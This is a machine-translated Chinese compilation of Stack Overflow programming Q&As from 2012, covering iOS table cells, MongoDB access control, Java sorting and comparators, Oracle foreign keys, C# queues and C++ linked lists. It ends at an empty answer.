# iphone - 与动态创建的单元格不同的原型单元格

> ID：13548597
> 
> 赞同：1
> 
> 时间：2012-11-25T05:31:18.360
> 
> 标签：iphone, ios, xcode

我在情节提要中创建了两种类型的原型单元。其中之一的尺寸已被定制以适应`UIButton`对象。但是，当创建单元格时，它们具有标准高度。我可以看到该`UIButton`对象，但由于单元格高度而被截断。

为什么新创建的细胞与原型细胞不同？

相关部分代码如下：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    UITableViewCell *cell;

    if(cell == nil)
    {

        cell = [tableView dequeueReusableCellWithIdentifier:@"PictureSelectionCell"];
        cell.selectionStyle = UITableViewCellSelectionStyleNone;

        pictureButtonProperty = (UIButton *) [cell viewWithTag:1];
    }
} 
```

展望未来，我有哪些选择来创建故事板中定义的宽度（或尺寸）单元格？以编程方式，我将能够通过创建`CGRect`具有指定尺寸的对象然后使用`initWithFrame`. 但是，我想避免手动操作。

感谢您的答复。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:41:22.917

首先，您始终可以使用代码进行设置

```
 -(CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    return YOUR_ROW_HEIGHT;
} 
```

其他方式，如果你选择你的 UITableView 如果情节提要，在尺寸检查器下更改行高。

![设置行高](../Images/c3b20fc02031fcc838c82fb337b15739.png)

# node.js - 在 MongoDB 中建模访问控制

> ID：13548601
> 
> 赞同：4
> 
> 时间：2012-11-25T05:31:54.313
> 
> 标签：node.js, mongodb, datamodel, database

有没有人有在 MongoDB 中建模访问控制的示例？我想到的情况是：

有一组资源，每一个都是它们自己的文档（例如汽车、人、树等）。

用户可以通过显式授权或通过成为资源的所有者、存在于另一个集合（例如角色）或其他一些隐式方式来隐式地访问资源。

在一个可以应用跳过和限制选项（用于分页）的 collection.find() 方法中，有没有办法检查所有这些显式和隐式路径并产生用户可以访问的资源的结果？

在 MySQL 中，我们使用带有资源 ID、授予用户 ID、授权用户 ID 和操作（读取、写入等）的授权表对此进行了建模。然后，在一个查询中，选择至少一个子查询为真的所有资源，然后子查询检查所有不同的访问路径，例如一个检查授权，一个检查所有权等。

我只是无法在 MongoDB 中这样做，我不确定它是否可能......

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T08:25:42.720

您一次不能查询多个文档。理想情况下，访问控制不应该成为业务逻辑的一部分。您的后端 php/c#/language 应该确保当前请求已获得授权。如果是这样，那么只需查询请求的文档。

如果您觉得，您需要在 mongodb 中实现完全相同的结构，我建议您不要这样做，那么您将需要嵌入所有这些字段（来自其他 mysql 表的字段，可帮助您识别请求是否被授权）在每个集合的每个文档中。您将复制数据（对其进行非规范化）。这带来了确保所有副本都已更新并具有相同值的问题。

编辑1：

让我们谈谈汽车文件。要跟踪其所有者，您将拥有`owner`财产（这将包含`_id`所有者文件）。要跟踪所有可以“使用”（显式授予）汽车的用户，您将拥有一个数组`allowerdDrivers`（这将包含`_id`每个`user`文档的 ）。让我们假设发出请求的当前用户属于“管理员”角色。该`user`文档将具有一个数组`applicableRoles`，用于存储`_id`每个适用的角色文档。

要检索用户有权访问的所有汽车，您只需进行两次查询。一个来取他的角色。如果他是管理员，则归还所有汽车。如果他不是，则进行另一个查询，其中`owner`等于他的 id`or` `allowedDrivers`包含他的 id。

我了解您的实际用例可能更复杂，但有可能有一种面向文档的方法来解决这个问题。您必须意识到，数据在文档中建模的方式与在 RDbMS 中建模的方式大不相同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T16:23:25.353

> 在业务逻辑中这样做会非常缓慢且效率低下。

怎么会这样？这是业务逻辑，如果用户 a 拥有帖子 b，则让他们执行操作（MVC 样式），否则不要。

这对我来说听起来像是业务逻辑，大多数框架都认为这个业务逻辑被放置在控制器动作中（MVC 范式）；即在 PHP Yii 中：

```
Yii::app()->roles->hasAccess('some_view_action_for_a_post', $post) 
```

我认为通过在数据库端执行此操作，您将存储层与业务层混淆了。

此外，由于某些基于角色的权限操作可以让您提交的查询非常复杂，因此必须有很多子选择。考虑到 MySQL 如何创建和处理结果集（子选择不是 JOINS），我感觉这些查询的扩展性不是特别好。

此外，您还必须考虑何时要更改角色或定义角色的函数，它可以访问某个对象，您必须直接更改 SQL 查询，而不仅仅是将角色添加到角色表并分配对象该角色的属性并分配该角色的用户（AKA 代码更改）。

因此，我会认真研究其他语言（以及您自己的）的其他框架如何执行 RBAC，因为我认为您已经模糊了界限，并且您所做的事情让您的生活变得非常艰难，实际上这里可能是一个很好的起点: [node.js 和 express.js 中基于组/规则的授权方法](https://stackoverflow.com/questions/9392978/group-rule-based-authorization-approach-in-node-js-and-express-js)

# c++ - 与在线留言板沟通

> ID：13548602
> 
> 赞同：-4
> 
> 时间：2012-11-25T05:31:55.297
> 
> 标签：c++

如何创建一个与在线网站的留言板通信的应用程序，例如 www.espn.com 的留言板，它可以检索帖子、发布内容和标记帖子。有人怎么可能去创建一个做这样的事情的应用程序？插座？

我想在 C++ 中创建它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:49:24.330

这实际上比听起来更复杂。大多数留言板不开放他们的 API（通常是为了防止垃圾邮件），如果他们这样做，您可能必须与他们合作以获取详细信息。

总体思路是：

*   打开到他们服务器的套接字
*   根据他们的 API 发送适当的数据
*   利润

如果你想破解它，你必须做一些抓取/wireshark 数据包嗅探来找出他们的 API。您可能需要阅读一些 cookie 才能获取通信令牌等。这是可能的，但工作量很大。

其他一些网站（如 Twitter 和 Google）开放了他们的 API，实际上提供了开发人员工具来与他们的数据进行交互。我认为像 ESPN 这样的网站不会对业余开发者开放，因此您可能必须签署某种协议。

如果您真的感兴趣，请阅读 HTTP（这是一个[非常简单的入门教程](http://www.jmarshall.com/easy/http/)）。大多数 API 都是基于 HTTP 协议构建的，因此您需要非常熟悉它。我建议使用 C++ 以外的东西，因为套接字工作可能有点乏味。尝试类似 Python 的东西。

# java - 用于替代字符串排序的 Java 比较器

> ID：13548604
> 
> 赞同：2
> 
> 时间：2012-11-25T05:32:03.867
> 
> 标签：java, sorting, comparator

编辑：比较器似乎没有做任何事情。我没有收到任何错误，但（已经按字母顺序排序的）数组没有改变。我应该期望看到 SAD 和 PAD 并排，但我没有。

我有一个字符串数组，我想根据从如何在拨号盘上键入它们得出的数值对它们进行排序。也就是说，“SAD”= 723，“PAD”= 723，“SAP”= 727。我有一个按字母顺序排列的字典，我想将它重新排列成我的顺序，以便对数组进行二进制搜索。对于像 SAD 和 PAD 这样的值相同的东西，它们可以按字母顺序排序。我想尝试使用 Arrays.sort(dictionary, myComparator) 对其进行排序。

首先，这是获得我想要的东西的最佳方式吗？我还能怎么得到这个？

其次，我如何制作自己的比较器？请注意，我只是在编程的第一门课程中，所以我们甚至还没有上课，这只是一堆塞进主课的东西。而且我通常根本不了解课程。因此，如果我必须自己编写课程来完成这项工作，那么我可能不得不自己编写一个快速排序代码。我也没有介绍链表，所以我的数据结构有点笨拙。这是我到目前为止所拥有的，我不知道我在做什么：

将字典放入内存的愚蠢笨拙的方法，重要的行在底部附近：

```
public static String[][] dictToMem()throws FileNotFoundException{
    File myFile = new File("src/words.txt");
    Scanner input = new Scanner(myFile);
    String temp;
    String[] tempDict = new String[7];
    Arrays.fill(tempDict, "");

    while (input.hasNext()){
        temp = input.next();
        if (temp.length() < 8 && temp.indexOf('\'') + temp.indexOf('(') +   temp.indexOf('-') == -3){
            for (int i = 1; i <= 7; i++){
                if (temp.length() == i){
                    tempDict[i-1] += " " + temp;
                }
            }
        }
    }
    for (int i = 0; i<tempDict.length; i++){
        tempDict[i] = tempDict[i].trim();
    }

    String[][] dictionary = new String[7][];
    for (int i = 0; i<tempDict.length; i++){
        dictionary[i] = tempDict[i].split(" ");
    }
    for (int i = 0; i<tempDict.length; i++){
        //  ***This is the line doesn't work, compiler error***
        //  dictionary[i] = Arrays.sort(dictionary[i], String.DialPadNumCompare);
        //  Should be this:
        Arrays.sort(dictionary[i], DialPadNumCompare);
    }
    return dictionary;
} 
```

并且比较器没有显示错误：

```
public static Comparator<String> DialPadNumCompare = new Comparator<String>(){
    @Override
    public int compare(String a, String b){
        if (stringToInt(a) == stringToInt(b)){
            return a.compareTo(b);
        }
        return stringToInt(b) - stringToInt(a);
    }
}; 
```

String to int 是我的字符串到拨号盘号码的转换方法

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:57:32.450

您的比较器不正确。将其更改为：

```
public static Comparator<String> dialPadNumCompare = new Comparator<String>(){
    @Override
    public int compare(String a, String b){
        int inta = stringToInt(a);
        int intb = stringToInt(b);
        if (inta == intb)
            return a.compareTo(b);
        return inta - intb;
    }
}; 
```

并使用以下代码调用此比较器：

```
Arrays.sort(dictionary, dialPadNumCompare); 
```

这是[现场演示](http://ideone.com/sYoD6r)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:36:56.797

对于您的直接错误，请更改以下行：

```
Arrays.sort(dictionary[i], String.DialPadNumCompare); 
```

至：

```
Arrays.sort(dictionary[i], DialPadNumCompare); 
```

你现在拥有它的方式，你试图静态引用`String`该类的一个不存在的成员。相反，您应该尝试引用`DialPadNumCompare`您在自己的类中创建的静态引用。

# database - 在 sqlplus 中创建表时出错

> ID：13548606
> 
> 赞同：0
> 
> 时间：2012-11-25T05:32:21.020
> 
> 标签：database, oracle, sqlplus

我是 sqlplus 的新手，正在尝试运行一个创建几个表的 sql 脚本，但是一旦我尝试运行它，它就会给我一个错误，说表或视图不存在，我不知道如何解决这个错误. 我的脚本是：

```
 drop table Borrower;
 create table Borrower (
     bid char(100) not null, 
     password char(100) not null, 
     name char(100) null, 
     address char(100) null, 
     phone char(100) null, 
     emailAddress char(100) null, 
     sinOrStNo char(100) null, 
     expiryDate date null, 
     --type ENUM('student','faculty','staff'),
     type char(100) not null,
     --CONSTRAINT Btype_check CHECK (type IN ('student','faculty','staff')),
     FOREIGN KEY (type) references BorrowerType(type),
     PRIMARY KEY (bid));
 grant select on Borrower to public; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T10:36:36.437

> “外键引用的表中的唯一/主键”

数据完整性对于正确运行的数据库至关重要，因此如果表的主键被另一个表的外键引用，Oracle 不会让我们删除表。所以它会抛出 ORA-02449。

因此，鉴于此设置：

```
create table t_parent (
    id number not null
    , constraint tp_pk primary key (id)
);
create table t_child (
    id number not null
    , p_id number not null 
    , constraint tc_pk primary key (id)
    , constraint tc_tp_fk foreign key (p_id)
        references t_parent (id)
); 
```

删除表有三种方法`t_parent`。

1.  先运行`drop table t_child`：没有子表，没有外键。
2.  删除阻塞外键：`alter table t_child drop constraint tc_pc_fk`.
3.  前一个的变体，让数据库找出外键： `drop table t_parent cascade constraints`.

第一个选项是最合适的，因为它使数据库处于有效状态（没有表，没有数据完整性损坏的可能性）。第三种方法的有效用途是从模式中清除所有表的脚本：从数据字典中生成这样的脚本很容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:59:19.183

删除或创建表的顺序很重要，因为如果您有引用另一个表的外键，则不能在删除您自己的表之前删除该表。在此示例中，必须在 BorrowerType 表之前删除 Borrower 表。

# c# - 多线程批处理队列

> ID：13548607
> 
> 赞同：3
> 
> 时间：2012-11-25T05:32:22.370
> 
> 标签：c#, multithreading, .net-3.5, queue, tcplistener

我目前正在编写一个 TCP 侦听器，该侦听器有许多客户端应用程序向其发送短消息。我拥有的 TCP 侦听器是一个 C# winform，我需要做的是批量处理这些日志，以避免在队列中收到的每条消息都命中数据库。目前，对于我在侦听器中收到的每条消息，我都会使用 C# 队列类进行入队。

一个单独的线程将每 5 分钟执行一次以检查此队列，如果有任何排队的项目，则开始处理队列。这种设计似乎存在并发/竞争条件问题，因为当 5 分钟线程启动时，收到的新消息无法再访问队列，因为我在 DeQueue 期间对其进行了锁定。因此，这些新消息会丢失。似乎只有当有大量消息发送到 TCP 侦听器时才会发生。

有没有人认为这是我的一个有缺陷的设计，或者会有更好的解决方案吗？根据发送消息的客户端应用程序的限制，我不允许使用 MSMQ 或 WCF。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T12:55:51.043

所以你有一个生产者-消费者场景，有多个生产者和一个（缓冲的）消费者。你可能想看看[Reactive Extensions](http://msdn.microsoft.com/en-us/data/gg577609)（他们有一个 .NET 3.5 的版本）。至少，您可以利用他们的[`BlockingCollection<T>`](http://msdn.microsoft.com/en-us/library/dd267312.aspx).

# java - 你可以使用数组引用de for循环的增量器吗

> ID：13548610
> 
> 赞同：0
> 
> 时间：2012-11-25T05:32:37.310
> 
> 标签：java, arrays, for-loop

我有这段代码，但是当我运行它时，它只会给我一个`NullPointerException`

```
import javax.swing.JOptionPane;
public class System {

public static void main(String[] args) {
    int a=Integer.parseInt(JOptionPane.showInputDialog("How many planets"));
    Planet p[]=new Planet[a];
    for (int i=1;i<=a;i++){
        ** p[i].setName("romain"); **
                    //line bugging is above
    }
    //for info the .setName method of the Planet class is
     /*public void setName(String Na){
     name=Na;
 }*/

}

} 
```

所以我的问题是：你能用增量器作为数组引用吗

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:38:13.347

您尚未初始化任何`Planet`引用。这就是您收到 NullPointerException 的原因。

`Planet p[]=new Planet[a]`创建一个引用数组`Planet`，但内容全部初始化为空。你需要有这样的东西：

```
Planet p[] = new Planet[a];
for (int i = 0; i < a; ++i) {
    p[i] = new Planet();
    p[i].setName("whatever");
} 
```

是的，您可以使用循环变量来索引数组。您可以根据需要使用循环变量：它只是一个普通变量，恰好被限定为循环。

请注意，在 Java 中，数组始终是从零开始的，而不是从一开始的。第一个元素的索引为零。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:38:29.913

您的数组没有说它将从索引 1 开始，也没有初始化为从 1 开始。给定您的输入样式，您将植物数量设置为数组长度。

从 0 开始循环。

```
int a=Integer.parseInt(JOptionPane.showInputDialog("How many planets"));
    Planet p[]=new Planet[a];
    for (int i=0;i<a;i++)
    {
//    -------------------------------------------------------------------
            p[i] = new Planet();       // initializing object reference
//    -------------------------------------------------------------------
        p[i].setName("romain");
    } 
```

**已编辑** **问题内容在评论*中解释*

# c++ - 没有类的c ++中的链表：分段错误

> ID：13548611
> 
> 赞同：0
> 
> 时间：2012-11-25T05:32:58.283
> 
> 标签：c++, list, linked-list, structure

我在学校尝试编写一个简单的家庭作业，并得到错误*Segmentation fault (core dumped)*，以这种方式在 C++ 中实现链表：

```
struct Word{
    string word;
    string meaning;
    Word * next;
};

struct dictionary{
    Word *head = NULL;
    int count;
}dict;

string addWord(string word, string meaning){
    Word *newWord = new Word;
    newWord -> word = word;
    newWord -> meaning = meaning;
    newWord -> next = dict.head;
    dict.head = newWord;
    dict.count++; 
} 
```

我正在尝试在遇到错误时添加一个单词（节点），我不能使用c ++类，因为是老师的要求，衷心感谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:48:16.760

`dict.count`永远不会被初始化。鉴于您的编译器可以在定义中包含默认初始化`struct`，您应该在定义的地方编写`int count = 0;`。这可能不会导致您的段错误，但您仍然需要修复它。

我怀疑`addWord`未能返回 a `string`，尽管它具有作为返回值，但可能会导致您的段错误。这会导致未定义的行为（可能会崩溃）。一个称职的编译器会给你一个致命的警告来编写你编写的代码。将返回类型更改`addWord`为`void`。像这样：

```
void addWord(string word, string meaning) 
```

关于在本网站上发布问题的一般建议：

当您发布问题时，请包括编译和运行代码所需的所有内容，包括`main`方法。从代码中删除您认为不重要的任何内容，但您留下的内容仍应运行，并应证明您的问题。

当你展示不完整的代码时，你就是个傻瓜：如果你知道什么是重要的，你就不需要寻求帮助，对吗？所以你需要发布完整的代码。

当你显示太多代码时，你就是不礼貌的。首先将您的代码缩减为显示您的问题的最小示例，但保持完整，以便我们可以看到您的真正问题在哪里。

# dictionary - python3从字典中查找/提取最大数字

> ID：13548612
> 
> 赞同：0
> 
> 时间：2012-11-25T05:33:21.663
> 
> 标签：dictionary, python-3.x, extract, scale

我有一本包含太阳系数据的字典*（例如行星和卫星的轨道半径）*，我想在我的字典中找到最大的轨道半径。稍后我将使用它作为我正在制作的动画的比例尺。但是我的代码出了点问题，我不确定出了什么问题？

```
scale = 600/max([planets[key]['Orbital Radius'] for key in planets]) 
```

我的动画窗口（在 中`QuickDraw`）是`600x600`所以我需要缩放我的轨道半径值，但上面的代码似乎不起作用。`planets`是我的字典。这是我的字典：

```
{'Mercury': {'Orbital Radius': '38001200', 'Radius': '243900.7',
'Period': '87.9691'}, 'Ariel': {'Orbital Radius': '8595000', 'Radius':
'60000', 'Period': '2.520379'}, 'Sun': {'Satellites':
'Mercury,Venus,Earth,Mars,Jupiter,Saturn,Uranus,Neptune,Ceres,Pluto,Haumea,Makemake,Eris',
'Orbital Radius': '0', 'Radius': '20890260'}, 'Phobos': {'Orbital
Radius': '3623500.6', 'Radius': '200000', 'Period': '0.31891023'},
'Deimos': {'Orbital Radius': '8346000', 'Radius': '200000.2',
'Period': '1.26244'}, 'Mars': {'Satellites': 'Phobos,Deimos', 'Orbital
Radius': '106669000', 'Radius': '339600.2', 'Period': '686.971'},
'Rhea': {'Orbital Radius': '24000000', 'Radius': '75000', 'Period':
'4.5'}, 'Oberon': {'Orbital Radius': '26235000', 'Radius': '75000',
'Period': '13.463'}, 'Europa': {'Orbital Radius': '36486200',
'Radius': '156000.8', 'Period': '3.551181'}, 'Tethys': {'Orbital
Radius': '13706000', 'Radius': '50000', 'Period': '1.9'}, 'Miranda':
{'Orbital Radius': '5822550', 'Radius': '23500', 'Period': '1.413'},
'Saturn': {'Satellites':
'Mimas,Enceladus,Tethys,Dione,Rhea,Titan,Iapetus', 'Orbital Radius':
'353572956', 'Radius': '6026800', 'Period': '10759.22'}, 'Uranus':
{'Satellites': 'Puck,Miranda,Ariel,Umbriel,Titania,Oberon', 'Orbital
Radius': '453572956', 'Radius': '2555900', 'Period': '30799'},
'Neptune': {'Satellites': 'Triton', 'Orbital Radius': '550000000',
'Radius': '2476400', 'Period': '60190'}, 'Titania': {'Orbital Radius':
'19575000', 'Radius': '75000', 'Period': '8.7058'}, 'Enceladus':
{'Orbital Radius': '10706000', 'Radius': '25000', 'Period': '1.4'},
'Venus': {'Orbital Radius': '57477000', 'Radius': '605100.8',
'Period': '224.698'}, 'Moon': {'Orbital Radius': '18128500', 'Radius':
'173700.10', 'Period': '27.321582'}, 'Triton': {'Orbital Radius':
'40000000', 'Radius': '135300', 'Period': '-5.8'}, 'Ceres': {'Orbital
Radius': '130995855', 'Radius': '48700', 'Period': '1679.67'},
'Mimas': {'Orbital Radius': '8433396', 'Radius': '20600', 'Period':
'0.9'}, 'Titan': {'Orbital Radius': '50706000', 'Radius': '257600',
'Period': '15.945'}, 'Ganymede': {'Orbital Radius': '47160000',
'Radius': '263400', 'Period': '7.15455296'}, 'Umbriel': {'Orbital
Radius': '11983500', 'Radius': '60000', 'Period': '4.144177'},
'Callisto': {'Orbital Radius': '69700000', 'Radius': '241000',
'Period': '16.6890184'}, 'Jupiter': {'Satellites':
'Io,Europa,Ganymede,Callisto', 'Orbital Radius': '210573600',
'Radius': '7149200', 'Period': '4332.59'}, 'Io': {'Orbital Radius':
'22000000', 'Radius': '182100.3', 'Period': '1.7691377186'}, 'Earth':
{'Satellites': 'Moon', 'Orbital Radius': '77098290', 'Radius':
'637100.0', 'Period': '365.256363004'}, 'Dione': {'Orbital Radius':
'17106000', 'Radius': '56000', 'Period': '2.7'}, 'Iapetus': {'Orbital
Radius': '72285891', 'Radius': '75000', 'Period': '79'}} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T11:51:33.000

您中的所有值`dictionary`都是字符串，因此您会看到错误：

`TypeError: unsupported operand type(s) for /: 'int' and 'str'`

这告诉您您正在使用`int` *（值 600）*并试图将其除以`/`显然`string`没有意义的 a。您需要先使用以下方法将字符串转换为浮点数`float()`：

`scale = 600/float(max([planets[key]['Orbital Radius'] for key in planets]))`

它需要是 a`float`而不是 an`int`因为你正在尝试缩小，所以值`scale`将小于`1`例如如果最大值是`1200`并且你的网格大小是`600`你的比例将是`0.5` *(a half)*。

# java - Java：不使用 Arrays.sort() 对整数数组进行排序

> ID：13548619
> 
> 赞同：11
> 
> 时间：2012-11-25T05:34:34.350
> 
> 标签：java, arrays, sorting, integer, int

这是我们 Java 课程中的一个练习中的说明。首先，我想说我“做我的功课”，而且我不只是懒惰地要求 Stack Overflow 上的某个人为我回答这个问题。在所有其他练习中，这个特定项目一直是我的问题，因为我一直在努力为此寻找“完美算法”。

> 编写将输入 10 个整数值并按升序或降序显示的 JAVA 程序。注意：不允许使用 Arrays.sort()。

这是我想出的代码，它可以工作，但它有一个明显的缺陷。如果我输入相同的值两次或更多次，例如：

> 5, 5, 5, 4, 6, 7, 3, 2, 8, 10

输入的三个 5 中只有一个会被计算并包含在输出中。我得到的输出（升序）是：

> 2 3 4 5 0 0 6 7 8 10。

```
import java.util.Scanner;

public class Exer3AscDesc
{
    public static void main(String args[])
    {
        Scanner scan = new Scanner(System.in);
        int tenNums[]=new int[10], orderedNums[]=new int[10];
        int greater;
        String choice;

        //get input
        System.out.println("Enter 10 integers : ");
        for (int i=0;i<tenNums.length;i++)
        {
            System.out.print(i+1+"=> ");
            tenNums[i] = scan.nextInt();
        }
        System.out.println();

        //imperfect number ordering algorithm
        for(int indexL=0;indexL<tenNums.length;indexL++)
        {
            greater=0;
            for(int indexR=0;indexR<tenNums.length;indexR++)
            {
                if(tenNums[indexL]>tenNums[indexR])
                {
                    greater++;
                }
            }
            orderedNums[greater]=tenNums[indexL];
        }

        //ask if ascending or descending
        System.out.print("Display order :\nA - Ascending\nD - Descending\nEnter your choice : ");
        choice = scan.next();

        //output the numbers based on choice
        if(choice.equalsIgnoreCase("a"))
        {
            for(greater=0;greater<orderedNums.length;greater++)
            {
                System.out.print(orderedNums[greater]+" ");
            }
        }
        else if(choice.equalsIgnoreCase("d"))
        {
            for(greater=9;greater>-1;greater--)
            {
                System.out.print(orderedNums[greater]+" ");
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2015-02-28T19:02:26.200

简单排序算法[冒泡排序](http://en.wikipedia.org/wiki/Bubble_sort)：

```
public static void main(String[] args) {
    int[] arr = new int[] { 6, 8, 7, 4, 312, 78, 54, 9, 12, 100, 89, 74 };

    for (int i = 0; i < arr.length; i++) {
        for (int j = i + 1; j < arr.length; j++) {
            int tmp = 0;
            if (arr[i] > arr[j]) {
                tmp = arr[i];
                arr[i] = arr[j];
                arr[j] = tmp;
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-25T06:13:24.387

您可以在互联网上找到许多不同的排序算法，但如果您想修复自己的解决方案，您可以在代码中进行以下更改：

代替：

```
 orderedNums[greater]=tenNums[indexL]; 
```

你需要这样做：

```
while (orderedNums[greater] == tenNums[indexL]) {
     greater++;
}
orderedNums[greater] = tenNums[indexL]; 
```

此代码基本上检查该特定索引是否被相似的数字占用，然后它将尝试查找下一个空闲索引。

注意：由于排序数组元素中的默认值为 0，因此您需要确保 0 不在您的列表中。否则，您需要使用您确定不在列表中的特殊数字启动排序数组，例如：`Integer.MAX_VALUE`

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2018-02-22T09:40:16.187

简单的方法：

```
int a[]={6,2,5,1};
            System.out.println(Arrays.toString(a));
             int temp;
             for(int i=0;i<a.length-1;i++){
                 for(int j=0;j<a.length-1;j++){
                     if(a[j] > a[j+1]){   // use < for Descending order
                         temp = a[j+1];
                         a[j+1] = a[j];
                         a[j]=temp;
                     }
                 }
             }
            System.out.println(Arrays.toString(a));

    Output:
    [6, 2, 5, 1]
    [1, 2, 5, 6] 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-17T00:34:18.560

这是一个简单的解决方案

```
public static void main(String[] args) {        
        //Without using Arrays.sort function
        int i;
        int nos[] = {12,9,-4,-1,3,10,34,12,11};
        System.out.print("Values before sorting: \n");
        for(i = 0; i < nos.length; i++)
            System.out.println( nos[i]+"  ");               
        sort(nos, nos.length);
        System.out.print("Values after sorting: \n");       
        for(i = 0; i <nos.length; i++){
            System.out.println(nos[i]+"  ");
        }
    }

    private static void sort(int nos[], int n) {
     for (int i = 1; i < n; i++){
          int j = i;
          int B = nos[i];
          while ((j > 0) && (nos[j-1] > B)){
            nos[j] = nos[j-1];
            j--;
          }
          nos[j] = B;
        }
    } 
```

输出是：

排序前的值：

> 12
> 9
> -4
> -1
> 3
> 10
> 34
> 12
> 11

排序后的值：

> -4
> -1
> 3
> 9
> 10
> 11
> 12
> 12
> 34

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-25T05:36:32.977

如果您不太担心性能，我建议您查看[选择排序](http://en.wikipedia.org/wiki/Selection_sort)或[插入排序。](http://en.wikipedia.org/wiki/Insertion_sort)也许这会给你一些想法。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-01-12T18:37:48.087

```
int x[] = { 10, 30, 15, 69, 52, 89, 5 };
    int max, temp = 0, index = 0;
    for (int i = 0; i < x.length; i++) {
        int counter = 0;
        max = x[i];
        for (int j = i + 1; j < x.length; j++) {

            if (x[j] > max) {
                max = x[j];
                index = j;
                counter++;
            }

        }
        if (counter > 0) {
            temp = x[index];
            x[index] = x[i];
            x[i] = temp;
        }
    }
    for (int i = 0; i < x.length; i++) {
        System.out.println(x[i]);
    } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-11-20T08:46:30.753

 **```
int[] arr = {111, 111, 110, 101, 101, 102, 115, 112};

/* for ascending order */

System.out.println(Arrays.toString(getSortedArray(arr)));
/*for descending order */
System.out.println(Arrays.toString(getSortedArray(arr)));

private int[] getSortedArray(int[] k){  

        int localIndex =0;
        for(int l=1;l<k.length;l++){
            if(l>1){
                localIndex = l;
                while(true){
                    k = swapelement(k,l);
                    if(l-- == 1)
                        break;
                }
                l = localIndex;
            }else
                k = swapelement(k,l);   
        }
        return k;
    }

    private int[] swapelement(int[] ar,int in){
        int temp =0;
        if(ar[in]<ar[in-1]){
            temp = ar[in];
            ar[in]=ar[in-1];
            ar[in-1] = temp;
        }

        return ar;
    }

private int[] getDescOrder(int[] byt){
        int s =-1;
        for(int i = byt.length-1;i>=0;--i){
              int k = i-1;
              while(k >= 0){
                  if(byt[i]>byt[k]){
                      s = byt[k];
                      byt[k] = byt[i];
                      byt[i] = s;
                  }
                  k--;
              }
           }
        return byt;
    } 
```*  *输出：-
升序：- 101, 101, 102, 110, 111, 111, 112, 115

降序：- 115, 112, 111, 111, 110, 102, 101, 101

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-08-31T11:16:55.967

数组排序不使用java中的内置函数......只需创建新文件取消这个名称 - >（ArraySorting.java）......运行项目并享受它！！！！

```
 import java.io.*;
    import java.util.Arrays;
    import java.util.Scanner;
    public class ArraySorting 
    {
    public static void main(String args[])
    {
      int temp=0;   
      Scanner user_input=new Scanner(System.in);
       System.out.println("enter Size of Array...");
    int Size=user_input.nextInt();

    int[] a=new int[Size];
    System.out.println("Enter element Of an Array...");
    for(int j=0;j<Size;j++)
    {
        a[j]=user_input.nextInt();
    }     
    for(int index=0;index<a.length;index++)
    {
        for(int j=index+1;j<a.length;j++)
        {
             if(a[index] > a[j] ) 
             {
                 temp = a[index];
                 a[index] = a[j];
                 a[j] = temp;
             }
        }
    }
    System.out.print("Output is:- ");
    for(int i=0;i<a.length;i++)
    {
        System.out.println(a[i]);
    }

}
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-07-28T21:30:34.783

冒泡排序可以在这里使用：

```
 //Time complexity: O(n^2)
public static int[] bubbleSort(final int[] arr) {

    if (arr == null || arr.length <= 1) {
        return arr;
    }

    for (int i = 0; i < arr.length; i++) {
        for (int j = 1; j < arr.length - i; j++) {
            if (arr[j - 1] > arr[j]) {
                arr[j] = arr[j] + arr[j - 1];
                arr[j - 1] = arr[j] - arr[j - 1];
                arr[j] = arr[j] - arr[j - 1];
            }
        }
    }

    return arr;
} 
```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2015-03-10T15:17:06.927

```
class Sort 
{
    public static void main(String[] args) 
    {
    System.out.println("Enter the range");
    java.util.Scanner sc=new java.util.Scanner(System.in);
    int n=sc.nextInt();
    int arr[]=new int[n];
    System.out.println("Enter the array values");
    for(int i=0;i<=n-1;i++)
    {
        arr[i]=sc.nextInt();

    }
    System.out.println("Before sorting array values are");
     for(int i=0;i<=n-1;i++)
    {
     System.out.println(arr[i]);
       }
    System.out.println();
    for(int pass=1;pass<=n;pass++)
    {
    for(int i=0;i<=n-1;i++)
    {
        if(i==n-1)
        {
            break;
        }
        int temp;
        if(arr[i]>arr[i+1])
        {

            temp=arr[i];
            arr[i]=arr[i+1];
            arr[i+1]=temp;
        }
    }
    }

    System.out.println("After sorting array values are");
       for(int i=0;i<=n-1;i++)
    {
     System.out.println(arr[i]);
       }

}
} 
```

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2016-06-06T06:36:39.773

**这里是排序简单的例子试试**

```
public class SortingSimpleExample {

    public static void main(String[] args) {
        int[] a={10,20,1,5,4,20,6,4,2,5,4,6,8,-5,-1};
              a=sort(a);
        for(int i:a)
              System.out.println(i);
}
    public static int[] sort(int[] a){

        for(int i=0;i<a.length;i++){
            for(int j=0;j<a.length;j++){
                int temp=0;
                if(a[i]<a[j]){
                    temp=a[j];                  
                    a[j]=a[i];                  
                    a[i]=temp;      
                  }         
                }
        }
        return a;

    }
} 
```

* * *

## 回答 #12

> 赞同：-2
> 
